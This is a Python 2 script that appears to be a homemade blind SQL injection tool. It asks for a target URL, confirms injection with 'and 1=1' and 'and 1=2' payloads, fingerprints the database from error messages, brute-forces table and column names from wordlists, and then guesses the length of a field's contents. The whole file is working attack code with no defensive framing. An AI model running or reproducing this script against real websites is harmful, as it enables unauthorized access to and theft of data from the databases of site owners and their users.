import requests
from bs4 import BeautifulSoup
from re import search
import os
import string
import urllib
use=raw_input('Enter the URL for SQL injection:')
user=use
def Webpage():
  global header,link
  url="{}".format(user)
  header={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'}
  link=requests.get(url,headers=header)
  if link.status_code == 200:
      print('URL stability can be linked.')
  else:
      print('URL link failure')
      exit()
Webpage()
def start():
  a='%20and%201=1'
  b='%20and%201=2'
  url=user
  urla=user+a
  urlb=user+b
  page=urllib.urlopen(url).read()
  pagea=urllib.urlopen(urla).read()
  pageb=urllib.urlopen(urlb).read()
  if page == pagea and page != pageb:
    print('Existence of SQL injection !')
  else:
    print('SQL injection does not exist')
    exit()
start()
def database():
    print('[!]Try to judge the type of the database')
    db=''
    sql="".join('%20and20%user>0')
    url=user
    pgex=urllib.urlopen(url+sql).read()
    if search ('ODBC Microsoft Access',pgex) or search('Microsoft JET Database',pgex):
        print('data base: Access')
        return db
    elif search('SQL Server',pgex) or search('nvarchar',pgex):
        print('database: MSSQL')
        return db
    elif search('You have an error in your SQL syntax',pgex) or search('Query failed',pgex) or search('SQL query failed',pgex) or search('mysql_fetch_',pgex) or search('mysql_num_rows',pgex) or search('The used SELECT statements have a different number of columns',pgex) or search(" Warning: mysql_fetch_array():",pgex):
        print('data base: MYSQL')
        return db
    else:
        print('No database type is judged!')
        exit()
database()
def stopwatch():
    global tables
    liudao=[]
    tables=open('dict.txt','r').read().split('\n')
    for b in tables:
        tablesurl="%20and%20exists%20(select%20*%20from%20{})".format(b)
        page=urllib.urlopen(user).read()
        pagex=urllib.urlopen(user+tablesurl).read()
        if page == pagex:
            liudao.append(tablesurl)
        else:
          pass
    if len(liudao)==0:
        print '[-]Unable to find table name'
    else:
        print '[+]Find the name of the table'
        for c in liudao:
            print user,c
stopwatch()
uii=raw_input('Please specify a table:')
def filed(s):
    shengdao=[]
    fileds=open('fileds.txt','r').read().split('\n')
    for x in fileds:
        filedsurl=string.join(['%20and%20exists%20(select%20',x,'%20from%20',s,')'],'')
        page=urllib.urlopen(user).read()
        pagex=urllib.urlopen(user+filedsurl).read()
        if page == pagex:
            shengdao.append(filedsurl)
        else:
            pass
    if len(shengdao) == 0:
        print '[-]Unable to find fileds name'
    else:
        print '[+]Find the name the fileds'
        for f in shengdao:
            print user,f
filed(uii)
luwei=raw_input('Please enter the field name:')
def filedlen(gy,djs):
    diyudao=[]
    fildens=open('fileds.txt','r').read().split('\n')
    for lu in fildens:
        payload=string.join(['%20and%201=(select%20count(*)%20from%20',gy,'%20where%20len(',djs,')>',lu,')'],"")
        page=urllib.urlopen(user).read()
        pagex=urllib.urlopen(user+payload).read()
        if page == pagex:
            diyudao.append(payload)
        else:
            pass
    if len(diyudao) == 0:
        print '[-]Sorry to find out the length of field content'
    else:
        print '[+]Guessing the length of field content'
        for gy in diyudao:
            print user,gy
filedlen(uii,luwei)